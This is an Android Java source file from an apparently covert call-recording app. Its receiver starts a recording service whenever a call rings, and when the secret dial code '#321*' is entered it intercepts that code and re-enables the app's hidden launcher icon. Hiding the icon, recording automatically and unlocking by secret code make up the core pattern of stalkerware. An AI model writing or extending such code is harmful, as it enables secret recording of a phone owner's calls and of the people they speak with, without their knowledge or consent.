package com.imtuandung.demorecordingcall;


import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.telephony.TelephonyManager;
import android.util.Log;

public class OnCallReceiver extends BroadcastReceiver {
    final String TAGS = "OnCallReceiver";

    @Override
    public void onReceive(final Context context, Intent intent) {
        try {
            String number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            if (number.equals("#321*")) {
                Log.e(TAGS, "Accept code");
                abortBroadcast();
                setResultData(null);
                showApp(context);
                Intent i = new Intent(context, MainActivity.class);
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                i.setAction(Intent.ACTION_MAIN);
                context.startActivity(i);


            } else {
                String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
                Log.d(TAGS, "onReceive " + state);
                if (state == null || state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                    context.getApplicationContext().startService(new Intent(context.getApplicationContext(), RecorderCallService.class));
                }
            }
        } catch (Exception e) {
            Log.e(TAGS, e.getMessage());
        }
    }

    /**
     * Show app icon function
     *
     * @param
     * @return
     * @see
     */
    private void showApp(Context context) {
        try {
            ComponentName componentToDisable = new ComponentName(
                    context.getPackageName(), MainActivity.class.getName());
            PackageManager p = context.getPackageManager();

            p.setComponentEnabledSetting(componentToDisable,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP);

        } catch (Exception e) {
            Log.e("Show app by secret_key", e.getMessage());
        }
    }
}
